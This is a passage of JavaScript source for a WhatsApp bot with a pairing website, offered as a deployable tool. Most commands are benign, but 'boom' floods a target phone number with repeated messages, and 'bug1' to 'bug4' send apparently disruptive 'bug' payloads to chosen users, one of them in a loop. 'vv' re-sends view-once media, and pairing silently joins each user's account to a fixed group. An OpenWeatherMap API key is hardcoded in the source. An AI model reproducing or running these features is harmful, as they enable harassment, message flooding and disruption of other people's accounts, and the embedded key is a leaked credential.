  if (isGroup && !isMe) { const gs = getGroupSettings(from); if (gs.antilink && /(https?:\/\/|chat\.whatsapp\.com|wa\.me|t\.me|www\.)/i.test(text) && !isAuthorized(sender, isMe)) { try { await sock.sendMessage(from, { delete: key }); await sock.sendMessage(from, { text: `@${senderNum} Links not allowed!`, mentions: [sender] }); return; } catch (_) {} } }
  const prefix = dbSettings.prefix || PREFIX;
  if (!text.startsWith(prefix)) return;
  const args = text.slice(prefix.length).trim().split(/\s+/); const command = args[0]?.toLowerCase(); const argsText = args.slice(1).join(' ');
  if (dbSettings.mode === 'private' && !isAuthorized(sender, isMe)) return;
  console.log(`[CMD] ${command} from ${senderNum}`);
  try {
    switch (command) {
      case 'menu': case 'list': await sock.sendMessage(from, { text: getMenuText() }); break;
      case 'ping': { const t0 = Date.now(); await sock.sendMessage(from, { text: 'Pong!' }); await sock.sendMessage(from, { text: `Speed: *${Date.now()-t0}ms* | Uptime: *${formatUptime(Date.now()-startTime)}*` }); break; }
      case 'speed': { const t0 = Date.now(); await sock.sendMessage(from, { text: 'Speed test...' }); await sock.sendMessage(from, { text: `Speed: *${Date.now()-t0}ms*` }); break; }
      case 'runtime': case 'uptime': await sock.sendMessage(from, { text: `Uptime: *${formatUptime(Date.now()-startTime)}*` }); break;
      case 'alive': case 'info': { const waNum = waSocket?.user?.id ? waSocket.user.id.split('@')[0].split(':')[0] : 'N/A'; await sock.sendMessage(from, { text: `☠️ *${BOT_NAME}* v${BOT_VERSION}\nNumber: *${waNum}*\nPrefix: *${dbSettings.prefix}*\nMode: *${dbSettings.mode}*\nUptime: *${formatUptime(Date.now()-startTime)}*` }); break; }
      case 'owner': await sock.sendMessage(from, { text: `👑 Owner: *${dbSettings.ownerName || 'MAKAMESCO'}*` }); break;
      case 'script': case 'repo': await sock.sendMessage(from, { text: `📦 *Repo*\n${REPO_URL}\nBot: ${BOT_NAME} v${BOT_VERSION}\nEngine: mrxd-baileys` }); break;
      case 'credits': await sock.sendMessage(from, { text: `☠️ *CREDITS*\n${BOT_NAME} v${BOT_VERSION}\nDev: ${dbSettings.ownerName || 'MAKAMESCO'}\n© 2025 TOXIC TECH INC` }); break;
      case 'poll': { if (!argsText) return sock.sendMessage(from, { text: `Usage: ${prefix}poll q | opt1 | opt2` }); const p = argsText.split('|').map(s=>s.trim()); if (p.length<3) return; await sock.sendMessage(from, { poll: { name: p[0], values: p.slice(1), selectableCount: 1 } }); break; }
      case 'dp': { try { let jid = from; if (argsText) { jid = argsText.replace(/[@\s+]/g,'')+'@s.whatsapp.net'; } const pp = await sock.profilePictureUrl(jid,'image'); await sock.sendMessage(from, { image: { url: pp }, caption: `DP of ${jid.split('@')[0]}` }); } catch { await sock.sendMessage(from, { text: 'No DP available' }); } break; }
      case 'antidelete': { if (!isAuthorized(sender,isMe)) return; if (isGroup) { const gs=getGroupSettings(from); gs.antidelete=!gs.antidelete; await sock.sendMessage(from,{text:`Anti-Delete: *${gs.antidelete?'ON ✅':'OFF ❌'}* (group)`}); } else { dbSettings.antidelete=!dbSettings.antidelete; saveSettings(); await sock.sendMessage(from,{text:`Anti-Delete: *${dbSettings.antidelete?'ON ✅':'OFF ❌'}*`}); } break; }
      case 'anticall': { if (!isAuthorized(sender,isMe)) return; dbSettings.anticall=!dbSettings.anticall; saveSettings(); await sock.sendMessage(from,{text:`Anti-Call: *${dbSettings.anticall?'ON ✅':'OFF ❌'}*`}); break; }
      case 'antilink': { if (!isGroup||!isAuthorized(sender,isMe)) return; const gs=getGroupSettings(from); gs.antilink=!gs.antilink; await sock.sendMessage(from,{text:`Anti-Link: *${gs.antilink?'ON ✅':'OFF ❌'}*`}); break; }
      case 'mode': { if (!isAuthorized(sender,isMe)) return; dbSettings.mode=dbSettings.mode==='private'?'public':'private'; saveSettings(); await sock.sendMessage(from,{text:`Mode: *${dbSettings.mode}*`}); break; }
      case 'prefix': { if (!isAuthorized(sender,isMe)) return; if (!argsText) return; dbSettings.prefix=argsText[0]; saveSettings(); await sock.sendMessage(from,{text:`Prefix: *${dbSettings.prefix}*`}); break; }
      case 'autoread': { if (!isAuthorized(sender,isMe)) return; dbSettings.autoread=!dbSettings.autoread; saveSettings(); await sock.sendMessage(from,{text:`Auto-Read: *${dbSettings.autoread?'ON ✅':'OFF ❌'}*`}); break; }
      case 'autotyping': { if (!isAuthorized(sender,isMe)) return; dbSettings.autotyping=!dbSettings.autotyping; saveSettings(); await sock.sendMessage(from,{text:`Auto-Typing: *${dbSettings.autotyping?'ON ✅':'OFF ❌'}*`}); break; }
      case 'alwaysonline': { if (!isAuthorized(sender,isMe)) return; dbSettings.alwaysonline=!dbSettings.alwaysonline; saveSettings(); await sock.sendMessage(from,{text:`Always Online: *${dbSettings.alwaysonline?'ON ✅':'OFF ❌'}*`}); break; }
      case 'setownername': { if (!isAuthorized(sender,isMe)) return; if (!argsText) return; dbSettings.ownerName=argsText; saveSettings(); await sock.sendMessage(from,{text:`Owner name: *${dbSettings.ownerName}*`}); break; }
      case 'restart': { if (!isOwner(sender,isMe)) return; await sock.sendMessage(from,{text:'Restarting...'}); process.exit(0); break; }
      case 'block': { if (!isOwner(sender,isMe)) return; const t=resolveTarget(msg,argsText); if (!t) return; await sock.updateBlockStatus(t,'block'); await sock.sendMessage(from,{text:`Blocked ${t.split('@')[0]}`}); break; }
      case 'unblock': { if (!isOwner(sender,isMe)) return; const t=resolveTarget(msg,argsText); if (!t) return; await sock.updateBlockStatus(t,'unblock'); await sock.sendMessage(from,{text:`Unblocked ${t.split('@')[0]}`}); break; }
      case 'addsudo': { if (!isOwner(sender,isMe)) return; const n=normalizePhone(argsText); if (!n) return; if (!dbSudo.includes(n)){dbSudo.push(n);saveSudo();} await sock.sendMessage(from,{text:`Sudo: ${n}`}); break; }
      case 'remsudo': { if (!isOwner(sender,isMe)) return; const n=normalizePhone(argsText); dbSudo=dbSudo.filter(s=>s!==n);saveSudo(); await sock.sendMessage(from,{text:`Removed: ${n}`}); break; }
      case 'listsudo': { if (!isOwner(sender,isMe)) return; await sock.sendMessage(from,{text:`Sudo:\n${dbSudo.map(s=>'• '+s).join('\n')||'None'}`}); break; }
      case 'broadcast': { if (!isOwner(sender,isMe)) return; if (!argsText) return; const chats=await sock.groupFetchAllParticipating(); let s=0; for (const [gid] of Object.entries(chats)) { try { await sock.sendMessage(gid,{text:`📢 Broadcast\n\n${argsText}`}); s++; } catch(_){} } await sock.sendMessage(from,{text:`Broadcast sent to ${s} groups`}); break; }
      case 'join': { if (!isOwner(sender,isMe)) return; if (!argsText) return; try { const c=argsText.split('/').pop().split('?')[0]; await sock.groupAcceptInvite(c); await sock.sendMessage(from,{text:'Joined!'}); } catch(e) { await sock.sendMessage(from,{text:`Failed: ${e.message}`}); } break; }
      case 'boom': { if (!isAuthorized(sender,isMe)) return; const ps=argsText.split(/\s+/); if (ps.length<3) return sock.sendMessage(from,{text:`Usage: ${prefix}boom <text> <number> <count>`}); const cnt=parseInt(ps[ps.length-1]); const ph=ps[ps.length-2]; const bt=ps.slice(0,-2).join(' '); if (isNaN(cnt)||cnt<1||cnt>100) return; const tj=normalizePhone(ph)+'@s.whatsapp.net'; await sock.sendMessage(from,{text:`💣 Booming ${ph} x${cnt}...`}); let sent=0; for (let i=0;i<cnt;i++) { try { await sock.sendMessage(tj,{text:bt}); sent++; } catch(_){break;} if (i%5===4) await new Promise(r=>setTimeout(r,1000)); } await sock.sendMessage(from,{text:`💣 Sent ${sent}/${cnt}`}); break; }
      case 'bug': case 'bug1': { if (!isAuthorized(sender,isMe)) return; const t=resolveTarget(msg,argsText); if (!t) return; await sendBug(sock,t,'bug1'); await sock.sendMessage(from,{text:`Bug1 sent to ${t.split('@')[0]}`}); break; }
      case 'bug2': { if (!isAuthorized(sender,isMe)) return; const t=resolveTarget(msg,argsText); if (!t) return; await sendBug(sock,t,'bug2'); await sock.sendMessage(from,{text:`Bug2 sent`}); break; }
      case 'bug3': { if (!isAuthorized(sender,isMe)) return; const t=resolveTarget(msg,argsText); if (!t) return; await sendBug(sock,t,'bug3'); await sock.sendMessage(from,{text:`Bug3 sent`}); break; }
      case 'bug4': { if (!isAuthorized(sender,isMe)) return; const t=resolveTarget(msg,argsText); if (!t) return; await sendBug(sock,t,'bug4'); await sock.sendMessage(from,{text:`Bug4 loop started`}); break; }
      case 'killbug': killAllBugs(); await sock.sendMessage(from,{text:'Bugs killed!'}); break;
      case 'ytmp3': case 'yta': { if (!argsText) return; try { const r=await axios.get(`https://api.dreaded.site/api/ytdl?url=${encodeURIComponent(argsText)}`); if (r.data?.result?.download_url) { await sock.sendMessage(from,{text:`🎵 ${r.data.result.title||'Audio'}`}); await sock.sendMessage(from,{audio:{url:r.data.result.download_url},mimetype:'audio/mp4'}); } else await sock.sendMessage(from,{text:'Download failed'}); } catch { await sock.sendMessage(from,{text:'API error'}); } break; }
      case 'ytmp4': case 'ytv': { if (!argsText) return; try { const r=await axios.get(`https://api.dreaded.site/api/ytdl?url=${encodeURIComponent(argsText)}`); if (r.data?.result?.download_url) { await sock.sendMessage(from,{video:{url:r.data.result.download_url},caption:r.data.result.title||''}); } else await sock.sendMessage(from,{text:'Download failed'}); } catch { await sock.sendMessage(from,{text:'API error'}); } break; }
      case 'play': case 'song': { if (!argsText) return; try { const r=await axios.get(`https://api.dreaded.site/api/yts?query=${encodeURIComponent(argsText)}`); if (r.data?.result?.[0]?.url) { const s=r.data.result[0]; const d=await axios.get(`https://api.dreaded.site/api/ytdl?url=${encodeURIComponent(s.url)}`); if (d.data?.result?.download_url) await sock.sendMessage(from,{audio:{url:d.data.result.download_url},mimetype:'audio/mp4'}); } } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
      case 'yts': { if (!argsText) return; try { const r=await axios.get(`https://api.dreaded.site/api/yts?query=${encodeURIComponent(argsText)}`); if (r.data?.result?.length>0) { const res=r.data.result.slice(0,5).map((v,i)=>`${i+1}. *${v.title}*\n${v.duration||'N/A'}`).join('\n\n'); await sock.sendMessage(from,{text:`🔍 YouTube\n\n${res}`}); } } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
      case 'promote': { if (!isGroup||!isAuthorized(sender,isMe)) return; const m=msg.message?.extendedTextMessage?.contextInfo?.mentionedJid; if (!m?.length) return; await sock.groupParticipantsUpdate(from,m,'promote'); await sock.sendMessage(from,{text:`Promoted`,mentions:m}); break; }
      case 'demote': { if (!isGroup||!isAuthorized(sender,isMe)) return; const m=msg.message?.extendedTextMessage?.contextInfo?.mentionedJid; if (!m?.length) return; await sock.groupParticipantsUpdate(from,m,'demote'); await sock.sendMessage(from,{text:`Demoted`,mentions:m}); break; }
      case 'remove': case 'kick': { if (!isGroup||!isAuthorized(sender,isMe)) return; const m=msg.message?.extendedTextMessage?.contextInfo?.mentionedJid; if (!m?.length) return; await sock.groupParticipantsUpdate(from,m,'remove'); await sock.sendMessage(from,{text:`Removed`,mentions:m}); break; }
      case 'add': { if (!isGroup||!isAuthorized(sender,isMe)) return; const n=normalizePhone(argsText); if (!n) return; try { await sock.groupParticipantsUpdate(from,[n+'@s.whatsapp.net'],'add'); await sock.sendMessage(from,{text:`Added ${n}`}); } catch(e) { await sock.sendMessage(from,{text:`Failed: ${e.message}`}); } break; }
      case 'tagall': { if (!isGroup||!isAuthorized(sender,isMe)) return; const meta=await sock.groupMetadata(from); const ps=meta.participants.map(p=>p.id); await sock.sendMessage(from,{text:`${argsText||'Tag All'}\n\n${ps.map(p=>'@'+p.split('@')[0]).join(' ')}`,mentions:ps}); break; }
      case 'hidetag': { if (!isGroup||!isAuthorized(sender,isMe)) return; const meta=await sock.groupMetadata(from); const ps=meta.participants.map(p=>p.id); await sock.sendMessage(from,{text:argsText||'Hidden tag',mentions:ps}); break; }
      case 'open': { if (!isGroup||!isAuthorized(sender,isMe)) return; await sock.groupSettingUpdate(from,'not_announcement'); await sock.sendMessage(from,{text:'Opened'}); break; }
      case 'close': { if (!isGroup||!isAuthorized(sender,isMe)) return; await sock.groupSettingUpdate(from,'announcement'); await sock.sendMessage(from,{text:'Closed'}); break; }
      case 'subject': { if (!isGroup||!isAuthorized(sender,isMe)) return; await sock.groupUpdateSubject(from,argsText); break; }
      case 'desc': { if (!isGroup||!isAuthorized(sender,isMe)) return; await sock.groupUpdateDescription(from,argsText); break; }
      case 'leave': { if (!isGroup||!isAuthorized(sender,isMe)) return; await sock.groupLeave(from); break; }
      case 'mute': { if (!isGroup||!isAuthorized(sender,isMe)) return; await sock.groupSettingUpdate(from,'announcement'); break; }
      case 'unmute': { if (!isGroup||!isAuthorized(sender,isMe)) return; await sock.groupSettingUpdate(from,'not_announcement'); break; }
      case 'revoke': { if (!isGroup||!isAuthorized(sender,isMe)) return; await sock.groupRevokeInvite(from); break; }
      case 'ai': { if (!argsText) return; try { const r=await axios.get(`https://api.dreaded.site/api/chatgpt?text=${encodeURIComponent(argsText)}`); await sock.sendMessage(from,{text:`🤖 ${r.data?.result||r.data?.response||'No response'}`}); } catch { await sock.sendMessage(from,{text:'AI failed'}); } break; }
      case 'define': { if (!argsText) return; try { const r=await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(argsText)}`); const d=r.data[0]?.meanings[0]?.definitions[0]; if (d) await sock.sendMessage(from,{text:`📖 *${argsText}*\n${d.definition}`}); } catch { await sock.sendMessage(from,{text:'Not found'}); } break; }
      case 'fact': await sock.sendMessage(from,{text:`💡 ${randomPick(facts)}`}); break;
      case 'joke': await sock.sendMessage(from,{text:`😂 ${randomPick(jokes)}`}); break;
      case 'quotes': await sock.sendMessage(from,{text:`💬 ${randomPick(quotes)}`}); break;
      case '8ball': { if (!argsText) return; await sock.sendMessage(from,{text:`🎱 ${randomPick(eightBallResponses)}`}); break; }
      case 'truth': await sock.sendMessage(from,{text:`🤔 ${randomPick(truths)}`}); break;
      case 'dare': await sock.sendMessage(from,{text:`🔥 ${randomPick(dares)}`}); break;
      case 'advice': await sock.sendMessage(from,{text:`💡 ${randomPick(adviceList)}`}); break;
      case 'country': { if (!argsText) return; try { const r=await axios.get(`https://restcountries.com/v3.1/name/${encodeURIComponent(argsText)}`); const c=r.data[0]; await sock.sendMessage(from,{text:`🌍 *${c.name.common}*\nCapital: ${c.capital?.[0]||'N/A'}\nPop: ${c.population?.toLocaleString()||'N/A'}`}); } catch { await sock.sendMessage(from,{text:'Not found'}); } break; }
      case 'currency': { if (!argsText) return; try { const r=await axios.get(`https://restcountries.com/v3.1/currency/${encodeURIComponent(argsText)}`); await sock.sendMessage(from,{text:`💰 ${argsText.toUpperCase()}: ${r.data.map(c=>c.name.common).join(', ')}`}); } catch { await sock.sendMessage(from,{text:'Not found'}); } break; }
      case 'weather': { if (!argsText) return; try { const r=await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(argsText)}&appid=060a6bcfa19883c5654a6a3136b45323&units=metric`); const w=r.data; await sock.sendMessage(from,{text:`🌤️ ${w.name}: ${w.main.temp}°C, ${w.weather[0].description}`}); } catch { await sock.sendMessage(from,{text:'Not found'}); } break; }
      case 'calc': { if (!argsText) return; try { const res=Function('"use strict";return ('+argsText.replace(/[^0-9+\-*/.()% ]/g,'')+')')(); await sock.sendMessage(from,{text:`🧮 ${argsText} = *${res}*`}); } catch { await sock.sendMessage(from,{text:'Invalid!'}); } break; }
      case 'tts': { if (!argsText) return; try { await sock.sendMessage(from,{audio:{url:`https://api.dreaded.site/api/tts?text=${encodeURIComponent(argsText)}&lang=en`},mimetype:'audio/mp4'}); } catch { await sock.sendMessage(from,{text:'TTS failed'}); } break; }
      case 'trt': { const ta=argsText.split(/\s+/); if (ta.length<2) return; try { const r=await axios.get(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(ta.slice(1).join(' '))}&langpair=en|${ta[0]}`); await sock.sendMessage(from,{text:`🌐 ${r.data?.responseData?.translatedText||'Failed'}`}); } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
      case 'url': { if (!argsText) return sock.sendMessage(from,{text:`Usage: ${prefix}url <image/video url>`}); try { const r=await axios.get(argsText,{responseType:'arraybuffer',timeout:20000,maxContentLength:50*1024*1024}); const b=Buffer.from(r.data); const ct=(r.headers['content-type']||'').toLowerCase(); if (ct.includes('video')||argsText.match(/\.(mp4|3gp|webm)(\?|$)/i)) await sock.sendMessage(from,{video:b,caption:'📹 From URL'}); else if (ct.includes('audio')||argsText.match(/\.(mp3|ogg)(\?|$)/i)) await sock.sendMessage(from,{audio:b,mimetype:ct}); else await sock.sendMessage(from,{image:b,caption:'🖼️ From URL'}); } catch(e) { await sock.sendMessage(from,{text:`Failed: ${e.message}`}); } break; }
      case 'image': { if (!argsText) return; try { const r=await axios.get(`https://api.dreaded.site/api/image?query=${encodeURIComponent(argsText)}`); if (r.data?.result?.url) { const i=await axios.get(r.data.result.url,{responseType:'arraybuffer',timeout:15000}); await sock.sendMessage(from,{image:Buffer.from(i.data),caption:`🖼️ ${argsText}`}); } } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
      case 'purple': case 'neon': case 'matrix': case 'devil': case 'ice': case 'thunder': case 'snow': case 'metallic': { if (!argsText) return; await sock.sendMessage(from,{text:applyTextStyle(command,argsText)}); break; }
      case 'fancy': { if (!argsText) return; await sock.sendMessage(from,{text:fancyText(argsText,1)}); break; }
      case 'bible': { if (!argsText) return; try { const r=await axios.get(`https://bible-api.com/${encodeURIComponent(argsText)}`); if (r.data?.text) await sock.sendMessage(from,{text:`📖 *${r.data.reference}*\n\n${r.data.text.trim()}`}); } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
      case 'quran': { if (!argsText) return; try { const r=await axios.get(`https://api.alquran.cloud/v1/surah/${argsText}`); if (r.data?.data?.ayahs) { const a=r.data.data.ayahs.slice(0,3).map(x=>`${x.numberInSurah}. ${x.text}`).join('\n\n'); await sock.sendMessage(from,{text:`🕌 Surah ${r.data.data.englishName}\n\n${a}`}); } } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
      case 'pair': await sock.sendMessage(from,{text:'🔗 Use the pairing website or Telegram bot (/pair) to pair.'}); break;
      case 'getpp': case 'pp': case 'pfp': { try { let jid=sender; if (argsText) jid=argsText.replace(/[@\s+]/g,'')+'@s.whatsapp.net'; const pp=await sock.profilePictureUrl(jid,'image'); await sock.sendMessage(from,{image:{url:pp},caption:`🖼️ ${jid.split('@')[0]}`}); } catch { await sock.sendMessage(from,{text:'No DP'}); } break; }
      case 'sticker': { const q=msg.message?.extendedTextMessage?.contextInfo?.quotedMessage; if (!q?.imageMessage) return; try { const b=await sock.downloadMediaMessage({key:msg.key,message:q}); await sock.sendMessage(from,{sticker:b}); } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
      case 'photo': { const q=msg.message?.extendedTextMessage?.contextInfo?.quotedMessage; if (!q?.stickerMessage) return; try { const b=await sock.downloadMediaMessage({key:msg.key,message:q}); await sock.sendMessage(from,{image:b}); } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
      case 'mp4': { const q=msg.message?.extendedTextMessage?.contextInfo?.quotedMessage; if (!q?.stickerMessage) return; try { const b=await sock.downloadMediaMessage({key:msg.key,message:q}); await sock.sendMessage(from,{video:b,caption:'Converted'}); } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
      case 'vv': case 'retrieve': { const q=msg.message?.extendedTextMessage?.contextInfo?.quotedMessage; if (!q) return; try { const b=await sock.downloadMediaMessage({key:msg.key,message:q}); if (q.imageMessage) await sock.sendMessage(from,{image:b,caption:'🔓 Retrieved'}); else if (q.videoMessage) await sock.sendMessage(from,{video:b,caption:'🔓 Retrieved'}); else if (q.audioMessage) await sock.sendMessage(from,{audio:b,mimetype:'audio/mp4'}); } catch { await sock.sendMessage(from,{text:'Failed'}); } break; }
    }
  } catch (err) { console.error(`[CMD-${command}] Error:`, err.message); }
}

// ══════════════════════════════════════════════
//  WEB API ROUTES (Pairing Site)
// ══════════════════════════════════════════════

function getQRDataUrl(data) {
  return new Promise((resolve, reject) => {
    QRCode.toDataURL(data, { width: 256, margin: 2, color: { dark: '#00ff88', light: '#0a0a0a' } }, (err, url) => {
      if (err) reject(err); else resolve(url);
    });
  });
}

async function createWASession(sessionId, phone) {
  const authDir = path.join(PAIR_AUTH_DIR, sessionId);
  if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });
  const s = { sock: null, status: 'connecting', pairingCode: null, phone, qr: null, qrDataUrl: null, connected: false, waNumber: null };
  activePairSessions.set(sessionId, s);
  try {
    const { state, saveCreds } = await useMultiFileAuthState(authDir);
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({ version, logger: waLogger, auth: state, browser: Browsers.ubuntu('Chrome'), printQRInTerminal: false, markOnlineOnConnect: true });
    s.sock = sock; sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update;
      if (qr) { s.qr = qr; s.status = 'qr_ready'; try { s.qrDataUrl = await getQRDataUrl(qr); } catch {} if (phone && !state.creds.registered) { await new Promise(r=>setTimeout(r,2000)); try { const np=normalizePhone(phone); const code=await sock.requestPairingCode(np); s.pairingCode=`${code.slice(0,4)}-${code.slice(4)}`; s.status='pairing_code_ready'; } catch(e) { s.status='pairing_failed'; s.error=e.message; } } }
      if (connection === 'open') { s.connected=true; s.status='connected'; s.waNumber=sock.user?.id?.split('@')[0]?.split(':')[0]||'Unknown'; try { const oj=sock.user.id; await sock.sendMessage(oj,{text:`╭━━━⬡ TOXIC TECH ⬡━━━╮\n┃\n┃ THANKS FOR JOINING\n┃ TOXIC TECH\n┃ PAIRED SUCCESSFULLY ✅\n┃\n┃ Bot: ${BOT_NAME}\n┃ Version: v${BOT_VERSION}\n┃\n╰━━━━━━━━━━━━━━━━━━╯`}); await sock.sendMessage(oj,{text:`🔑 Your Session ID: *${sessionId}*\n\nSave this ID to reconnect.`}); try { const gc=AUTO_JOIN_GROUP.split('/').pop().split('?')[0]; await sock.groupAcceptInvite(gc); } catch {} } catch {} }
      if (connection === 'close') { s.connected=false; const sc=lastDisconnect?.error?.output?.statusCode; if (sc===440||sc===DisconnectReason.loggedOut) { s.status=sc===440?'replaced':'logged_out'; return; } s.status='reconnecting'; setTimeout(()=>createWASession(sessionId,null),5000); }
    });
  } catch (err) { s.status='error'; s.error=err.message; }
}

app.get('/api/status/:sessionId', (req, res) => { const s=activePairSessions.get(req.params.sessionId); if (!s) return res.json({status:'not_found'}); res.json({status:s.status,pairingCode:s.pairingCode,qrAvailable:!!s.qrDataUrl,connected:s.connected,waNumber:s.waNumber,error:s.error||null}); });
app.get('/api/qr/:sessionId', (req, res) => { const s=activePairSessions.get(req.params.sessionId); if (!s||!s.qrDataUrl) return res.status(404).send('No QR'); const b=Buffer.from(s.qrDataUrl.split(',')[1],'base64'); res.writeHead(200,{'Content-Type':'image/png'}); res.end(b); });
app.post('/api/pair', async (req, res) => { const phone=req.body.phone||''; const sid=generateSessionId(); try { await createWASession(sid,phone||null); res.json({sessionId:sid,status:'connecting'}); } catch(e) { res.status(500).json({error:e.message}); } });

// ──── WEB PAGE (same premium YOBBY TECH style) ────
app.get('/', (req, res) => {
  const connected = waConnected;
  const waNum = waSocket?.user?.id?.split('@')[0]?.split(':')[0] || 'Not linked';
  
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YOBBY TECH - Bot Deployment</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap');
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Rajdhani',sans-serif;background:#0a0a0a;color:#e0e0e0;min-height:100vh;overflow-x:hidden}
  body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(ellipse at 20% 50%,rgba(0,255,136,0.08) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(128,0,255,0.06) 0%,transparent 50%);z-index:-1}
  .container{max-width:520px;margin:0 auto;padding:20px;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
  .header{text-align:center;margin-bottom:30px;animation:fadeInDown .8s ease-out}
  @keyframes fadeInDown{from{opacity:0;transform:translateY(-30px)}to{opacity:1;transform:translateY(0)}}
  @keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
  .logo{font-family:'Orbitron',monospace;font-size:2.2rem;font-weight:900;background:linear-gradient(135deg,#00ff88,#00ccff,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px;margin-bottom:8px}
  .subtitle{font-size:.95rem;color:#666;letter-spacing:4px;text-transform:uppercase}
  .skull-icon{font-size:3rem;margin-bottom:10px;filter:drop-shadow(0 0 20px rgba(0,255,136,0.5));animation:float 3s ease-in-out infinite}
  @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
  .card{background:rgba(20,20,30,0.9);border:1px solid rgba(0,255,136,0.15);border-radius:20px;padding:35px;width:100%;backdrop-filter:blur(20px);box-shadow:0 0 40px rgba(0,255,136,0.05);animation:fadeInUp .8s ease-out .2s both}
  .card-title{font-family:'Orbitron',monospace;font-size:1.1rem;font-weight:700;color:#00ff88;text-align:center;margin-bottom:25px;letter-spacing:2px}
  .input-group{margin-bottom:20px}
  .input-group label{display:block;font-size:.85rem;color:#888;margin-bottom:8px;letter-spacing:1px;text-transform:uppercase}
  .input-group input{width:100%;padding:14px 18px;background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,136,0.2);border-radius:12px;color:#fff;font-family:'Rajdhani',sans-serif;font-size:1.1rem;letter-spacing:1px;transition:all .3s;outline:none}
  .input-group input:focus{border-color:#00ff88;box-shadow:0 0 20px rgba(0,255,136,0.15)}
  .btn{width:100%;padding:16px;border:none;border-radius:12px;font-family:'Orbitron',monospace;font-size:1rem;font-weight:700;letter-spacing:2px;cursor:pointer;transition:all .3s;text-transform:uppercase;margin-bottom:12px}
  .btn-primary{background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;box-shadow:0 0 30px rgba(0,255,136,0.3)}
  .btn-primary:hover{transform:translateY(-2px);box-shadow:0 0 50px rgba(0,255,136,0.5)}
  .btn-secondary{background:linear-gradient(135deg,#8b5cf6,#6d28d9);color:#fff;box-shadow:0 0 30px rgba(139,92,246,0.3)}
  .btn-secondary:hover{transform:translateY(-2px)}
  .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
  .pairing-code-container{display:none;text-align:center;margin-top:25px;animation:fadeInUp .5s ease-out}
  .pairing-code-label{font-size:.85rem;color:#888;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px}
  .pairing-code{font-family:'Orbitron',monospace;font-size:2.8rem;font-weight:900;color:#00ff88;letter-spacing:8px;padding:15px 30px;background:rgba(0,255,136,0.08);border:2px solid rgba(0,255,136,0.3);border-radius:15px;display:inline-block;text-shadow:0 0 20px rgba(0,255,136,0.5);animation:codeGlow 2s ease-in-out infinite alternate}
  @keyframes codeGlow{from{text-shadow:0 0 20px rgba(0,255,136,0.3)}to{text-shadow:0 0 40px rgba(0,255,136,0.8)}}
  .instructions{margin-top:20px;font-size:.9rem;color:#999;line-height:1.8;text-align:left}
  .instructions span{color:#00ff88;font-weight:600}
  .qr-container{display:none;text-align:center;margin-top:20px}
  .status-box{text-align:center;margin-top:20px;padding:15px;border-radius:12px;background:rgba(0,0,0,0.3);font-size:.9rem}
  .status-box.connected{border:1px solid #00ff88;color:#00ff88}
  .status-box.waiting{border:1px solid #f59e0b;color:#f59e0b}
  .status-box.error{border:1px solid #ef4444;color:#ef4444}
  .divider{display:flex;align-items:center;margin:20px 0;color:#444;font-size:.8rem;letter-spacing:2px}
  .divider::before,.divider::after{content:'';flex:1;height:1px;background:linear-gradient(to right,transparent,#333,transparent)}
  .divider span{padding:0 15px}
  .bot-status{margin-top:20px;padding:15px;background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.1);border-radius:12px;font-size:.9rem;text-align:center}
  .bot-status .label{color:#888;font-size:.8rem;letter-spacing:2px;text-transform:uppercase}
  .bot-status .value{color:#00ff88;font-family:'Orbitron',monospace;font-size:1.2rem}
  .footer{text-align:center;margin-top:30px;font-size:.8rem;color:#333;letter-spacing:2px}
  .footer a{color:#00ff88;text-decoration:none}
  .spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(0,255,136,0.3);border-top-color:#00ff88;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px;vertical-align:middle}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="skull-icon">☠️</div>
    <div class="logo">YOBBY TECH</div>
    <div class="subtitle">Bot Deployment Portal</div>
  </div>
  <div class="card">
    <div class="card-title">⚡ TOXIC YOBBY KING ⚡</div>
    <div class="bot-status">
      <div class="label">Bot Status</div>
      <div class="value" id="botStatus">${connected ? '✅ CONNECTED - ' + waNum : '❌ NOT CONNECTED'}</div>
    </div>
    <div class="divider"><span>CONNECT YOUR BOT</span></div>
    <div class="input-group">
      <label>🔑 Option 1: Enter Session ID</label>
      <input type="text" id="sessionIdInput" placeholder="e.g. toxicyobby-12345678" autocomplete="off">
    </div>
    <button class="btn btn-secondary" onclick="connectWithSession()">CONNECT WITH SESSION ID</button>
    <div class="divider"><span>OR</span></div>
    <div class="input-group">
      <label>📱 Option 2: Enter Phone Number</label>
      <input type="text" id="phoneInput" placeholder="e.g. 254712345678" autocomplete="off">
    </div>
    <button class="btn btn-primary" id="pairBtn" onclick="startPairing()">GET PAIRING CODE</button>
    <div class="divider"><span>OR</span></div>
